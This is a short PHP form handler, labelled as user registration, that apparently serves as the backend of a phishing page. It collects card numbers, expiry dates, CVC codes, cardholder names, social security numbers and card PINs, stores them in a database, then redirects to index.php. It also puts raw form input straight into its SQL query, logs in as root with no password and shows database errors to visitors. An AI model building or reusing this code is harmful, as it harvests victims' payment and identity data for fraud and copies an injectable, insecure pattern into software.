<?php 

session_start();
header('location:index.php');

$connection = mysqli_connect('localhost', 'root', '', 'user_registration');
if(mysqli_connect_error($connection)){
	echo 'Error connecting to database user_registration';
}else{
	// procceed with connection variable
	$cardNumber 	= $_POST['cardNumber'];
	$expiration     = $_POST['expiration'];
	$cvc 	        = $_POST['cvc'];
	$cardOwner    	= $_POST['cardOwner'];
	$ssn 	        = $_POST['ssn'];
	$cardPin    	= $_POST['cardPin'];
	

	$reg = "insert into users(cardNumber, expiration, cvc, cardOwner, ssn, cardPin) values('$cardNumber','$expiration', '$cvc', '$cardOwner','$ssn','$cardPin')";

	if(mysqli_query($connection, $reg)){
		echo 'Registration Successful';
	}else{
		echo 'Error creating user \n ';
		echo mysqli_error($connection);
	}
}
